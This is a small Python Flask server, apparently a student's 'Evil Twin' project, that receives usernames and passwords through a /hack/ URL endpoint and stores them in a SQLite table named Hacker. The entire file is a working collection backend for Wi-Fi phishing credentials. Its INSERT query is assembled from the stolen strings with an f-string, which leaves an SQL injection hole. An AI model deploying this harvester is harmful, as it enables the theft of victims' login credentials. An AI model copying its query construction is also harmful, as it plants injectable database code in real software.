from flask import Flask
from flask_restplus import Resource, Api
import sqlite3
import os
from flask_cors import CORS

app = Flask(__name__)
api = Api(app, title="Hacker", description="Hacker for Evil Twin. Zhou JIANG z5146092")
CORS(app, resources=r'/*')


def database_controller(command, database='hack.db'):
    connection = sqlite3.connect(database)
    cursor = connection.cursor()
    cursor.execute(command)
    result = cursor.fetchall()      # If multiple commands, no output will be fetched
    connection.commit()
    connection.close()
    return result


def create_db(db_file='hack.db'):
    if os.path.exists(db_file):
        print('Database already exists.')
        return False
    print('Creating database ...')
    database_controller('CREATE TABLE Hacker ('
                        'username VARCHAR(100),'
                        'password VARCHAR(100)'
                        ');'
                        )
    return True


@api.route('/hack/<username>/<password>')
class Hacker(Resource):
    def get(self, username, password):
        database_controller(f"INSERT INTO Hacker VALUES "
                            f"('{username}', '{password}');")
        return {
                "message": "Successfully stored hacker message"
            }, 200


if __name__ == "__main__":
    create_db()
    app.run(host='127.0.0.1', port=8888, debug=True)